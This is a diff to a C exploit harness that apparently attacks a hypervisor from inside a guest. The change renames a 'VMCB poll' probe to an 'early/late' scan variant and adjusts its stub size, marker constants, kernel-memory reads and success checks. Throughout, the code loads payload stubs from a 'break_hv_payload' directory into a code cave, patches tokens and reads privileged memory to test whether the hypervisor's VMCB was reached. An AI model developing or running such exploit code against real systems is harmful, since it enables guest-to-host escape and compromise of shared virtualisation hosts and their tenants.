@@ -28,8 +28,8 @@
 #ifdef AP_VMCB_STRIKE_1270
 #include "break_hv_payload/vmcb_strike_1270.h"
 #endif
-#ifdef AP_VMCB_POLL_1270
-#include "break_hv_payload/vmcb_poll_1270.h"
+#ifdef AP_VMCB_EARLY_LATE_1270
+#include "break_hv_payload/vmcb_early_late_1270.h"
 #endif
 #ifdef AP_CORE_ARG_1270
 #include "break_hv_payload/ap_arg_probe_1270.h"
@@ -61,10 +61,10 @@
 #else
 #define CARRIER_PA          0x3ffff000ULL
 #endif
-#ifdef AP_VMCB_POLL_1270
-#define AP_POLL_ENTERED     0x1270A9E17E5E3001ULL
+#ifdef AP_VMCB_EARLY_LATE_1270
+#define AP_SCAN_ENTERED     0x1270A9E17E5E3001ULL
 #define AP_MARKER           0x1270A9E17E5E3002ULL
-#define AP_POLL_TIMEOUT     0x1270A9E17E5E3003ULL
+#define AP_SCAN_INCOMPLETE     0x1270A9E17E5E3003ULL
 #define PARAM_QWORDS        3U
 #elif defined(AP_VMCB_STRIKE_1270)
 #define AP_SURVEY_ENTERED   0x1270A9E17E5E2001ULL
@@ -92,10 +92,10 @@
 #define STUB_BYTES          62U
 #define STUB_QWORDS         8U
 #define PROBE_STEM          "fixed-ap-arg"
-#elif defined(AP_VMCB_POLL_1270)
-#define STUB_BYTES          153U
-#define STUB_QWORDS         20U
-#define PROBE_STEM          "fixed-ap-vmcb-poll"
+#elif defined(AP_VMCB_EARLY_LATE_1270)
+#define STUB_BYTES          189U
+#define STUB_QWORDS         24U
+#define PROBE_STEM          "fixed-ap-vmcb-early-late"
 #elif defined(AP_VMCB_STRIKE_1270)
 #define STUB_BYTES          223U
 #define STUB_QWORDS         28U
@@ -229,11 +229,11 @@ static int patch_token(uint64_t token, uint64_t value)
 
 static int build_stub(uint64_t oracle, uint64_t vector)
 {
-#ifdef AP_VMCB_POLL_1270
-  if (vmcb_poll_1270_len != STUB_BYTES)
+#ifdef AP_VMCB_EARLY_LATE_1270
+  if (vmcb_early_late_1270_len != STUB_BYTES)
     return -1;
   memset(ap_stub, 0, sizeof(ap_stub));
-  memcpy(ap_stub, vmcb_poll_1270, STUB_BYTES);
+  memcpy(ap_stub, vmcb_early_late_1270, STUB_BYTES);
 #elif defined(AP_VMCB_STRIKE_1270)
   if (vmcb_strike_1270_len != STUB_BYTES)
     return -1;
@@ -565,8 +565,8 @@ int main(void)
 #ifdef AP_VMCB_STRIKE_1270
   uint64_t strike_ctrl_before = 0;
 #endif
-#ifdef AP_VMCB_POLL_1270
-  uint64_t poll_before[3] = {0};
+#ifdef AP_VMCB_EARLY_LATE_1270
+  uint64_t scan_before[3] = {0};
 #endif
 #ifdef AP_HV_READ_1270
   uint64_t hv_value_before = 0;
@@ -593,11 +593,11 @@ int main(void)
       || read_qword(cave + KH_OFF_USER + 24, &strike_ctrl_before) != 0 ||
       strike_ctrl_before != 0
 #endif
-#ifdef AP_VMCB_POLL_1270
-      || kread(cave + KH_OFF_USER + 16, poll_before,
-               sizeof(poll_before)) != 0 ||
-      poll_before[0] != 0 || poll_before[1] != 0 ||
-      poll_before[2] != 0
+#ifdef AP_VMCB_EARLY_LATE_1270
+      || kread(cave + KH_OFF_USER + 16, scan_before,
+               sizeof(scan_before)) != 0 ||
+      scan_before[0] != 0 || scan_before[1] != 0 ||
+      scan_before[2] != 0
 #endif
 #ifdef AP_HV_READ_1270
       || read_qword(cave + KH_OFF_USER + 16, &hv_value_before) != 0 ||
@@ -732,7 +732,7 @@ int main(void)
     }
   }
 #if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270) || \
-    defined(AP_VMCB_POLL_1270)
+    defined(AP_VMCB_EARLY_LATE_1270)
   uint64_t params[PARAM_QWORDS] = {
     stock_vector, kdldmap(0), cave + KH_OFF_USER + 8
   };
@@ -947,8 +947,8 @@ int main(void)
     }
     if (marker == SECOND_MARKER &&
         (ap_marker == AP_MARKER
-#ifdef AP_VMCB_POLL_1270
-         || ap_marker == AP_POLL_TIMEOUT
+#ifdef AP_VMCB_EARLY_LATE_1270
+         || ap_marker == AP_SCAN_INCOMPLETE
 #endif
 #if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
          || ap_marker == AP_SURVEY_REJECTED
@@ -963,9 +963,9 @@ int main(void)
       break;
     if ((marker != 0 && marker != SECOND_MARKER) ||
         (ap_marker != 0 && ap_marker != AP_MARKER
-#ifdef AP_VMCB_POLL_1270
-         && ap_marker != AP_POLL_ENTERED &&
-         ap_marker != AP_POLL_TIMEOUT
+#ifdef AP_VMCB_EARLY_LATE_1270
+         && ap_marker != AP_SCAN_ENTERED &&
+         ap_marker != AP_SCAN_INCOMPLETE
 #endif
 #if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
          && ap_marker != AP_SURVEY_ENTERED &&
@@ -988,9 +988,9 @@ int main(void)
 
   int fired = marker == SECOND_MARKER;
   int ap_entered = ap_marker == AP_MARKER
-#ifdef AP_VMCB_POLL_1270
-                   || ap_marker == AP_POLL_ENTERED ||
-                   ap_marker == AP_POLL_TIMEOUT
+#ifdef AP_VMCB_EARLY_LATE_1270
+                   || ap_marker == AP_SCAN_ENTERED ||
+                   ap_marker == AP_SCAN_INCOMPLETE
 #endif
 #if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
                    || ap_marker == AP_SURVEY_ENTERED ||
@@ -1012,10 +1012,10 @@ int main(void)
   int strike_ctrl_read = read_qword(cave + KH_OFF_USER + 24,
                                    &strike_ctrl);
 #endif
-#ifdef AP_VMCB_POLL_1270
-  uint64_t poll_values[3] = {0};
-  int poll_read = kread(cave + KH_OFF_USER + 16, poll_values,
-                        sizeof(poll_values));
+#ifdef AP_VMCB_EARLY_LATE_1270
+  uint64_t scan_values[3] = {0};
+  int scan_read = kread(cave + KH_OFF_USER + 16, scan_values,
+                        sizeof(scan_values));
 #endif
 #ifdef AP_HV_READ_1270
   int hv_read = read_qword(cave + KH_OFF_USER + 16, &hv_value);
@@ -1078,9 +1078,9 @@ int main(void)
 #ifdef AP_VMCB_STRIKE_1270
            ",reject_ctrl=0x%016" PRIx64 ",reject_ctrl_read=%d"
 #endif
-#ifdef AP_VMCB_POLL_1270
-           ",poll_first=0x%016" PRIx64 ",poll_last=0x%016" PRIx64
-           ",poll_count=%" PRIu64 ",poll_read=%d"
+#ifdef AP_VMCB_EARLY_LATE_1270
+           ",early_ctrl=0x%016" PRIx64 ",late_ctrl=0x%016" PRIx64
+           ",scan_count=%" PRIu64 ",scan_read=%d"
 #endif
 #ifdef AP_CORE_ARG_1270
            ",arg_read=%d,arg_nonzero=%u"
@@ -1106,8 +1106,8 @@ int main(void)
 #ifdef AP_VMCB_STRIKE_1270
            strike_ctrl, strike_ctrl_read,
 #endif
-#ifdef AP_VMCB_POLL_1270
-           poll_values[0], poll_values[1], poll_values[2], poll_read,
+#ifdef AP_VMCB_EARLY_LATE_1270
+           scan_values[0], scan_values[1], scan_values[2], scan_read,
 #endif
 #ifdef AP_CORE_ARG_1270
            arg_read, arg_nonzero,
@@ -1155,9 +1155,9 @@ int main(void)
 #ifdef AP_VMCB_STRIKE_1270
          && strike_ctrl_read == 0 && strike_ctrl == 0
 #endif
-#ifdef AP_VMCB_POLL_1270
-         && ap_marker == AP_MARKER && poll_read == 0 &&
-         (poll_values[1] & ~1ULL) == 8
+#ifdef AP_VMCB_EARLY_LATE_1270
+         && ap_marker == AP_MARKER && scan_read == 0 &&
+         scan_values[2] == 15
 #endif
 #ifdef AP_CORE_ARG_1270
          && arg_read == 0 && arg_nonzero != 0
